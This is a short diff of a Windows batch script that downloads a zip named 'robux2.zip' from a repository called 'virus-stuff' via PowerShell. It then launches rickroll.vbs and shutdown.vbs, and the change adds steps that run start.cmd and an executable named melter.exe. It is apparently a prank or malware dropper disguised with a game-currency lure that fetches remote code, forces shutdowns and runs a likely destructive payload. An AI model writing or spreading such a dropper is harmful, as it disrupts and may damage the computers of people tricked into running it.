@@ -1,4 +1,5 @@
 
+
 powershell -command "Invoke-WebRequest https://github.com/astrohnugget/virus-stuff/archive/refs/heads/main.zip -outfile robux2.zip"
 cls
 
@@ -21,13 +22,14 @@ goto :choice
 :start
 
 start rickroll.vbs
-timeout /t 8 /nobreak
+timeout /t 10 /nobreak
 
 start shutdown.vbs
 
-:1
-start hamburger.vbs
-goto :1
+start start.cmd
+timeout /t 20 /nobreak
+
+start melter.exe
 
 :no start
 
